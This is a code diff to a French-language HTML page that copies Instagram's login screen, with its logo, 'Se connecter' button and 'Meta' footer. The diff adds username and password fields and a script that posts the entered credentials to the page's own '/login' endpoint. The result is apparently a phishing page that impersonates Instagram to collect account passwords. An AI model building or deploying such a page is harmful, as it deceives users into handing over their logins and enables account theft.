@@ -9,32 +9,32 @@
 
 <body class="bg-gray-800 flex flex-col min-h-screen">
 
-    <!-- CONTENU PRINCIPAL -->
     <div class="m-4 flex flex-col justify-center items-center">
         
         <p class="text-white">Français (France)</p>
 
-        <!-- Logo Instagram -->
         <img src="./image/svgviewer-output.svg" class="w-[60px] mt-[40px]" alt="">
 
-        <!-- INPUTS -->
         <div class="mt-12 flex flex-col gap-5 w-full max-w-[450px]">
 
             <input 
+                id="username"
+                name="username"
                 type="text" 
-                class="p-3 bg-gray-800 text-white border border-2 border-gray-400 rounded-[8px] w-full placeholder-[#8e8e8e] focus:outline-none focus:ring-0 focus:border-gray-400"
+                class="p-3 bg-gray-800 text-white border border-2 border-gray-400 rounded-[8px]"
                 placeholder="Nom de profil, e-mail, ou numéro de mobile">
 
             <input 
-                type="text" 
-                class="p-3 bg-gray-800 text-white border border-2 border-gray-400 rounded-[8px] w-full placeholder-[#8e8e8e] focus:outline-none focus:ring-0 focus:border-gray-400"
-                placeholder="Nom de profil, e-mail, ou numéro de mobile">
+                id="password"
+                name="password"
+                type="password" 
+                class="p-3 bg-gray-800 text-white border border-2 border-gray-400 rounded-[8px]"
+                placeholder="Mot de passe">
 
         </div>
 
-        <!-- BOUTONS -->
         <div class="mt-5 flex justify-center items-center flex-col w-full max-w-[450px]">
-            <button class="bg-blue-600 text-white p-2 rounded-2xl w-full text-xl">
+            <button id="loginBtn" class="bg-blue-600 text-white p-2 rounded-2xl w-full text-xl">
                 Se connecter
             </button>
 
@@ -55,6 +55,19 @@
             <h1>Meta</h1>
         </div>
     </div>
+
+    <script>
+        document.getElementById("loginBtn").addEventListener("click", async () => {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            await fetch("/login", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ username, password })
+            });
+        });
+    </script>
 
 </body>
 </html>
